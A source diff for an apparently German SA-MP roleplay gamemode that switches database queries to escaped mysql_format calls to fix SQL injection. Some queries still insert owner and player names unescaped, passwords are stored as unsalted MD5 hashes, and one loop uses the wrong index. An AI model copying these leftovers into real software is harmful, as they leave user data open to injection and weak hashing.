+		mysql_format(MySQL_R394,query,sizeof(query),"UPDATE server_schwarzmarkt SET sfraktid='%d',sbdfraktid='%d',sx='%f',sy='%f',sz='%f',slocked='%d',smaterials='%d',swerbetext='%e',sprice='%d',skasse='%d',",
 		SmarkInfo[sm][sfraktid],SmarkInfo[sm][sbdfraktid],SmarkInfo[sm][sx],SmarkInfo[sm][sy],SmarkInfo[sm][sz],SmarkInfo[sm][slocked],SmarkInfo[sm][smaterials],SmarkInfo[sm][swerbetext],SmarkInfo[sm][sprice],SmarkInfo[sm][skasse]);
 	    strcat(mainquery,query);
 		format(query,sizeof(query),"sartikel0='%d',sartikel1='%d',sartikel2='%d',sartikel3='%d',sartikel4='%d',sartikel5='%d',sartikel6='%d',sartikel7='%d',sartikel8='%d',sartikel9='%d',sartikel10='%d',sartikel11='%d',sartikel12='%d',sartikel13='%d',sattackerfraktid='%d',swarownerpoints='%d',swarattackerpoints='%d',swartime='%d',swarsleep='%d' WHERE id='%d'",
@@ -80864,7 +80882,7 @@ stock OnGameModeSave()
 	strdel(mainquery,0,sizeof(mainquery));
  	while(gutscheinn<MAX_GUTSCHEIN && Gutschein[gutscheinn][gutscheincreatet] != 0)
 	{
-	    format(query,sizeof(query),"UPDATE server_gutscheine SET gutscheincode='%s',gutscheinname='%s',gutscheindesc='%s',gutscheintyp='%d',gutscheinmenge='%d',gutscheinanzahl='%d' WHERE id='%d'",
+	    mysql_format(MySQL_R394,query,sizeof(query),"UPDATE server_gutscheine SET gutscheincode='%e',gutscheinname='%e',gutscheindesc='%e',gutscheintyp='%d',gutscheinmenge='%d',gutscheinanzahl='%d' WHERE id='%d'",
 		Gutschein[gutscheinn][gutscheincode],Gutschein[gutscheinn][gutscheinname],Gutschein[gutscheinn][gutscheindesc],Gutschein[gutscheinn][gutscheintyp],Gutschein[gutscheinn][gutscheinmenge],Gutschein[gutscheinn][gutscheinanzahl],gutscheinn);
 		strcat(mainquery,query);
 		mysql_function_query(MySQL_R394,mainquery,false,"","");
@@ -80876,7 +80894,7 @@ stock OnGameModeSave()
 	strdel(query,0,sizeof(query));
 	while(haus<MAX_HAUS && HausInfo[haus][hauscreatet] != 0)
 	{
-	    format(query,sizeof(query),"UPDATE server_haus SET haus_besitzer='%s',haus_Owned='%d',haus_innenraum='%d',haus_miete='%d',haus_beschreibung='%s',haus_locked='%d',haus_slots='%d',haus_eingemitetenzaehler='%d',haus_x='%f',haus_y='%f',haus_z='%f',",
+	    mysql_format(MySQL_R394,query,sizeof(query),"UPDATE server_haus SET haus_besitzer='%e',haus_Owned='%d',haus_innenraum='%d',haus_miete='%d',haus_beschreibung='%e',haus_locked='%d',haus_slots='%d',haus_eingemitetenzaehler='%d',haus_x='%f',haus_y='%f',haus_z='%f',",
 		HausInfo[haus][haus_besitzer],HausInfo[haus][haus_Owned],HausInfo[haus][haus_innenraum],HausInfo[haus][haus_miete],HausInfo[haus][haus_beschreibung],HausInfo[haus][haus_locked],HausInfo[haus][haus_slots],HausInfo[haus][haus_eingemitetenzaehler],HausInfo[haus][haus_x],HausInfo[haus][haus_y],HausInfo[haus][haus_z]);
 		strcat(mainquery,query);
 		format(query,sizeof(query),"haus_preis='%d',haus_level='%d',haus_geldkasse='%d',haus_Opium='%d',haus_Spice='%d',haus_c4='%d',haus_Ganja='%d',haus_Kokain='%d',haus_materials='%d',haus_heal='%d',haus_armour='%d',haus_hatheal='%d',haus_hatarmour='%d',hausgundumper='%d',",
@@ -80921,7 +80939,7 @@ stock OnGameModeSave()
 	strdel(query,0,sizeof(query));
 	while(biz<MAX_BIZ && BizInfo[biz][bizcreatet] != 0)
 	{
-		format(query,sizeof(query),"UPDATE server_bizes SET biz_Owned='%d',biz_art='%d',biz_preis='%d',biz_level='%d',biz_geldkasse='%d',biz_locked='%d',biz_besitzer='%s',biz_teilhaber='%s',biz_beschreibung='%s',biz_artikel0='%d',biz_artikel1='%d',biz_artikel2='%d',biz_artikel3='%d',biz_artikel4='%d',biz_artikel5='%d',",
+		mysql_format(MySQL_R394,query,sizeof(query),"UPDATE server_bizes SET biz_Owned='%d',biz_art='%d',biz_preis='%d',biz_level='%d',biz_geldkasse='%d',biz_locked='%d',biz_besitzer='%e',biz_teilhaber='%e',biz_beschreibung='%e',biz_artikel0='%d',biz_artikel1='%d',biz_artikel2='%d',biz_artikel3='%d',biz_artikel4='%d',biz_artikel5='%d',",
 		BizInfo[biz][biz_Owned],BizInfo[biz][biz_art],BizInfo[biz][biz_preis],BizInfo[biz][biz_level],BizInfo[biz][biz_geldkasse],BizInfo[biz][biz_locked],BizInfo[biz][biz_besitzer],BizInfo[biz][biz_teilhaber],BizInfo[biz][biz_beschreibung],BizInfo[biz][biz_artikel][0],BizInfo[biz][biz_artikel][1],BizInfo[biz][biz_artikel][2],BizInfo[biz][biz_artikel][3],BizInfo[biz][biz_artikel][4],BizInfo[biz][biz_artikel][5]);
 		strcat(mainquery,query);
 	    format(query,sizeof(query),"biz_artikel6='%d',biz_artikel7='%d',biz_artikel8='%d',biz_artikel9='%d',biz_artikel10='%d',biz_artikel11='%d',biz_artikel12='%d',biz_artikel13='%d',biz_artikel14='%d',biz_x='%f',biz_y='%f',biz_z='%f',biz_interior='%d',rentbizvehiclemodelid='%d',tPos0='%f',tPos1='%f',tPos2='%f',tPos3='%f',tPos4='%f',tPos5='%f' WHERE id='%d'",
@@ -80938,7 +80956,7 @@ stock OnGameModeSave()
 	strdel(query,0,sizeof(query));
 	while(org<MAX_ORGANISATIONS && OrgInfo[org][OrgCreatet] != 0)
 	{
-		format(query,sizeof(query),"UPDATE server_firmen SET OrgName='%s',OrgOwner='%s',OrgMotto='%s',OrgKasse='%d',OrgMBeitrag='%d' WHERE id='%d'",OrgInfo[org][OrgName],OrgInfo[org][OrgOwner],OrgInfo[org][OrgMotto],OrgInfo[org][OrgKasse],OrgInfo[org][OrgMBeitrag],org);
+		mysql_format(MySQL_R394,query,sizeof(query),"UPDATE server_firmen SET OrgName='%e',OrgOwner='%s',OrgMotto='%e',OrgKasse='%d',OrgMBeitrag='%d' WHERE id='%d'",OrgInfo[org][OrgName],OrgInfo[org][OrgOwner],OrgInfo[org][OrgMotto],OrgInfo[org][OrgKasse],OrgInfo[org][OrgMBeitrag],org);
 		mysql_function_query(MySQL_R394,query,false,"","");
 		org++;
 	}
@@ -80947,7 +80965,7 @@ stock OnGameModeSave()
 	strdel(query,0,sizeof(query));
 	while(partei<MAX_PARTEI && PartInfo[partei][ParteiCreatet] != 0)
 	{
-		format(query,sizeof(query),"UPDATE server_patei SET ParteiName='%s',ParteiOwner='%s',ParteiMotto='%s',ParteiKasse='%d',ParteiMBeitrag='%d' WHERE id='%d'",PartInfo[partei][ParteiName],PartInfo[partei][ParteiOwner],PartInfo[partei][ParteiMotto],PartInfo[org][ParteiKasse],PartInfo[org][ParteiMBeitrag],partei);
+		mysql_format(MySQL_R394,query,sizeof(query),"UPDATE server_patei SET ParteiName='%e',ParteiOwner='%s',ParteiMotto='%e',ParteiKasse='%d',ParteiMBeitrag='%d' WHERE id='%d'",PartInfo[partei][ParteiName],PartInfo[partei][ParteiOwner],PartInfo[partei][ParteiMotto],PartInfo[org][ParteiKasse],PartInfo[org][ParteiMBeitrag],partei);
 		mysql_function_query(MySQL_R394,query,false,"","");
 		partei++;
 	}
@@ -82357,8 +82375,8 @@ stock isPlayerAMember(playerid,rang)
 }
 stock CreateAccount(playerid)
 {
-    new query[256];
-    format(query,sizeof(query),"INSERT INTO spieler (Name,Passwort,Email,Geschlecht) VALUES ('%s','%s','%s','%i')",SpielerName(playerid),MD5_Hash(Spieler[playerid][pPassword]),Spieler[playerid][pEmail],Spieler[playerid][pSex]);
+    new query[512];
+    mysql_format(MySQL_R394,query,sizeof(query),"INSERT INTO spieler (Name,Passwort,Email,Geschlecht) VALUES ('%e','%s','%e','%i')",SpielerName(playerid),MD5_Hash(Spieler[playerid][pPassword]),Spieler[playerid][pEmail],Spieler[playerid][pSex]);
     mysql_function_query(MySQL_R394,query,false,"","");
     format(query,sizeof(query),"SELECT * FROM spieler_waffen WHERE Name='%s'",SpielerName(playerid));
     mysql_function_query(MySQL_R394,query,true,"l_script_swaffen","i",playerid);
@@ -83592,7 +83610,7 @@ stock SaveOnlyOneSmarkt(sm)
     new mainquery[2000],query[700];
 	if(SmarkInfo[sm][screatet] != 0)
 	{
-		format(query,sizeof(query),"UPDATE server_schwarzmarkt SET sfraktid='%d',sbdfraktid='%d',sx='%f',sy='%f',sz='%f',slocked='%d',smaterials='%d',swerbetext='%s',sprice='%d',skasse='%d',",
+		mysql_format(MySQL_R394,query,sizeof(query),"UPDATE server_schwarzmarkt SET sfraktid='%d',sbdfraktid='%d',sx='%f',sy='%f',sz='%f',slocked='%d',smaterials='%d',swerbetext='%e',sprice='%d',skasse='%d',",
 		SmarkInfo[sm][sfraktid],SmarkInfo[sm][sbdfraktid],SmarkInfo[sm][sx],SmarkInfo[sm][sy],SmarkInfo[sm][sz],SmarkInfo[sm][slocked],SmarkInfo[sm][smaterials],SmarkInfo[sm][swerbetext],SmarkInfo[sm][sprice],SmarkInfo[sm][skasse]);
 	    strcat(mainquery,query);
 		format(query,sizeof(query),"sartikel0='%d',sartikel1='%d',sartikel2='%d',sartikel3='%d',sartikel4='%d',sartikel5='%d',sartikel6='%d',sartikel7='%d',sartikel8='%d',sartikel9='%d',sartikel10='%d',sartikel11='%d',sartikel12='%d',sartikel13='%d',sattackerfraktid='%d',swarownerpoints='%d',swarattackerpoints='%d',swartime='%d',swarsleep='%d' WHERE id='%d'",
@@ -83673,10 +83691,10 @@ stock ReturnPropertyData(playerid)
 }
 stock SaveOnlyOneHaus(haus)
 {
-    new mainquery[1315],query[450];
+    new mainquery[2200],query[900];
 	if(HausInfo[haus][hauscreatet] != 0 && haus != 0)
 	{
-	    format(query,sizeof(query),"UPDATE server_haus SET haus_besitzer='%s',haus_Owned='%d',haus_innenraum='%d',haus_miete='%d',haus_beschreibung='%s',haus_locked='%d',haus_slots='%d',haus_eingemitetenzaehler='%d',haus_x='%f',haus_y='%f',haus_z='%f',haus_mieterstatus='%d',",
+	    mysql_format(MySQL_R394,query,sizeof(query),"UPDATE server_haus SET haus_besitzer='%e',haus_Owned='%d',haus_innenraum='%d',haus_miete='%d',haus_beschreibung='%e',haus_locked='%d',haus_slots='%d',haus_eingemitetenzaehler='%d',haus_x='%f',haus_y='%f',haus_z='%f',haus_mieterstatus='%d',",
 		HausInfo[haus][haus_besitzer],HausInfo[haus][haus_Owned],HausInfo[haus][haus_innenraum],HausInfo[haus][haus_miete],HausInfo[haus][haus_beschreibung],HausInfo[haus][haus_locked],HausInfo[haus][haus_slots],HausInfo[haus][haus_eingemitetenzaehler],HausInfo[haus][haus_x],HausInfo[haus][haus_y],HausInfo[haus][haus_z],HausInfo[haus][haus_mieterstatus]);
 		strcat(mainquery,query);
 		format(query,sizeof(query),"haus_preis='%d',haus_level='%d',haus_geldkasse='%d',haus_Opium='%d',haus_Spice='%d',haus_c4='%d',haus_Ganja='%d',haus_Kokain='%d',haus_materials='%d',haus_heal='%d',haus_armour='%d',haus_hatheal='%d',haus_hatarmour='%d',hausgundumper='%d',",
@@ -83907,10 +83925,10 @@ stock UpdateBizLabel(biz,funktion)
 }
 stock SaveOnlyOneBiz(biz)
 {
-	new mainquery[1200],query[700];
+	new mainquery[2000],query[1000];
 	if(BizInfo[biz][bizcreatet] != 0 && biz != 0)
 	{
-	    format(query,sizeof(query),"UPDATE server_bizes SET biz_Owned='%d',biz_art='%d',biz_preis='%d',biz_level='%d',biz_geldkasse='%d',biz_locked='%d',biz_besitzer='%s',biz_teilhaber='%s',biz_beschreibung='%s',biz_artikel0='%d',biz_artikel1='%d',biz_artikel2='%d',biz_artikel3='%d',biz_artikel4='%d',biz_artikel5='%d',",
+	    mysql_format(MySQL_R394,query,sizeof(query),"UPDATE server_bizes SET biz_Owned='%d',biz_art='%d',biz_preis='%d',biz_level='%d',biz_geldkasse='%d',biz_locked='%d',biz_besitzer='%e',biz_teilhaber='%e',biz_beschreibung='%e',biz_artikel0='%d',biz_artikel1='%d',biz_artikel2='%d',biz_artikel3='%d',biz_artikel4='%d',biz_artikel5='%d',",
 		BizInfo[biz][biz_Owned],BizInfo[biz][biz_art],BizInfo[biz][biz_preis],BizInfo[biz][biz_level],BizInfo[biz][biz_geldkasse],BizInfo[biz][biz_locked],BizInfo[biz][biz_besitzer],BizInfo[biz][biz_teilhaber],BizInfo[biz][biz_beschreibung],BizInfo[biz][biz_artikel][0],BizInfo[biz][biz_artikel][1],BizInfo[biz][biz_artikel][2],BizInfo[biz][biz_artikel][3],BizInfo[biz][biz_artikel][4],BizInfo[biz][biz_artikel][5]);
 		strcat(mainquery,query);
 	    format(query,sizeof(query),"biz_artikel6='%d',biz_artikel7='%d',biz_artikel8='%d',biz_artikel9='%d',biz_artikel10='%d',biz_artikel11='%d',biz_artikel12='%d',biz_artikel13='%d',biz_artikel14='%d',biz_x='%f',biz_y='%f',biz_z='%f',biz_interior='%d',rentbizvehiclemodelid='%d',tPos0='%f',tPos1='%f',tPos2='%f',tPos3='%f',tPos4='%f',tPos5='%f' WHERE id='%d'",
@@ -83950,7 +83968,7 @@ stock BizName(biz)
 }
 stock CreateOrganisation(organisation[],playerid)
 {
-	new query[256];
+	new query[700];
     for(new org=1;org<MAX_ORGANISATIONS;org++)
 	{
 		if(OrgInfo[org][OrgCreatet] == 0)
@@ -83965,7 +83983,7 @@ stock CreateOrganisation(organisation[],playerid)
 			strmid(OrgInfo[org][OrgName],organisation,0,strlen(organisation),32);
 			strmid(OrgInfo[org][OrgOwner],Spieler[playerid][pName],0,strlen(Spieler[playerid][pName]),24);
 			strmid(OrgInfo[org][OrgMotto],"Keins",0,strlen("Keins"),128);
-			format(query,sizeof(query),"INSERT INTO server_firmen (id,OrgName,OrgOwner,OrgMotto,OrgKasse,OrgMBeitrag) VALUES ('%d','%s','%s','%s','0','0')",org,OrgInfo[org][OrgName],OrgInfo[org][OrgOwner],OrgInfo[org][OrgMotto]);
+			mysql_format(MySQL_R394,query,sizeof(query),"INSERT INTO server_firmen (id,OrgName,OrgOwner,OrgMotto,OrgKasse,OrgMBeitrag) VALUES ('%d','%e','%s','%e','0','0')",org,OrgInfo[org][OrgName],OrgInfo[org][OrgOwner],OrgInfo[org][OrgMotto]);
 		    mysql_function_query(MySQL_R394,query,false,"","");
 			return org;
 		}
@@ -83974,7 +83992,7 @@ stock CreateOrganisation(organisation[],playerid)
 }
 stock CreatePartei(parteis[],playerid)
 {
-	new query[256];
+	new query[700];
     for(new p=1;p<MAX_PARTEI;p++)
 	{
 		if(PartInfo[p][ParteiCreatet] == 0)
@@ -84006,7 +84024,7 @@ stock CreatePartei(parteis[],playerid)
 			strmid(PartInfo[p][ParteiName],parteis,0,strlen(parteis),32);
 			strmid(PartInfo[p][ParteiOwner],Spieler[playerid][pName],0,strlen(Spieler[playerid][pName]),24);
 			strmid(PartInfo[p][ParteiMotto],"Keins",0,strlen("Keins"),128);
-			format(query,sizeof(query),"INSERT INTO server_patei (id,ParteiName,ParteiOwner,ParteiMotto,ParteiKasse,ParteiMBeitrag) VALUES ('%d','%s','%s','%s','0','0')",p,PartInfo[p][ParteiName],PartInfo[p][ParteiOwner],PartInfo[p][ParteiMotto]);
+			mysql_format(MySQL_R394,query,sizeof(query),"INSERT INTO server_patei (id,ParteiName,ParteiOwner,ParteiMotto,ParteiKasse,ParteiMBeitrag) VALUES ('%d','%e','%s','%e','0','0')",p,PartInfo[p][ParteiName],PartInfo[p][ParteiOwner],PartInfo[p][ParteiMotto]);
 		    mysql_function_query(MySQL_R394,query,false,"","");
 			return p;
 		}
@@ -88070,10 +88088,10 @@ stock ClearProperty(playerid)
 }
 stock BanUser(playerid,admin[],reason[],zeit = -1)
 {
-    new query[256],LOGILOGI[256];
+    new query[512],LOGILOGI[256];
     gettime(stunde,minute,sekunde);
 	getdate(jahr,monat,tag);
-	format(query,sizeof(query),"INSERT INTO `server_bans` (`IP`,`Grund`,`Name`,`Admin`,`Zeit`,`Uhrzeit`,`Datum`) VALUES ('%s','%s','%s','%s','%d','%02d:%02d:%02d','%04d-%02d-%02d')",SpielerIP(playerid),reason,Spieler[playerid][pName],admin,zeit,stunde,minute,sekunde,jahr,monat,tag);
+	mysql_format(MySQL_R394,query,sizeof(query),"INSERT INTO `server_bans` (`IP`,`Grund`,`Name`,`Admin`,`Zeit`,`Uhrzeit`,`Datum`) VALUES ('%s','%e','%e','%e','%d','%02d:%02d:%02d','%04d-%02d-%02d')",SpielerIP(playerid),reason,Spieler[playerid][pName],admin,zeit,stunde,minute,sekunde,jahr,monat,tag);
 	mysql_function_query(MySQL_R394,query,false,"","");
 	format(LOGILOGI,sizeof(LOGILOGI),"["ClanTag"_AC]: %s / betreff: %s / Grund: %s / Zeit: %i",admin,Spieler[playerid][pName],reason,zeit);//LOGILOGI um einen Bug zu vermeiden
 	Log("User_Gebannt_Grund.txt",LOGILOGI);
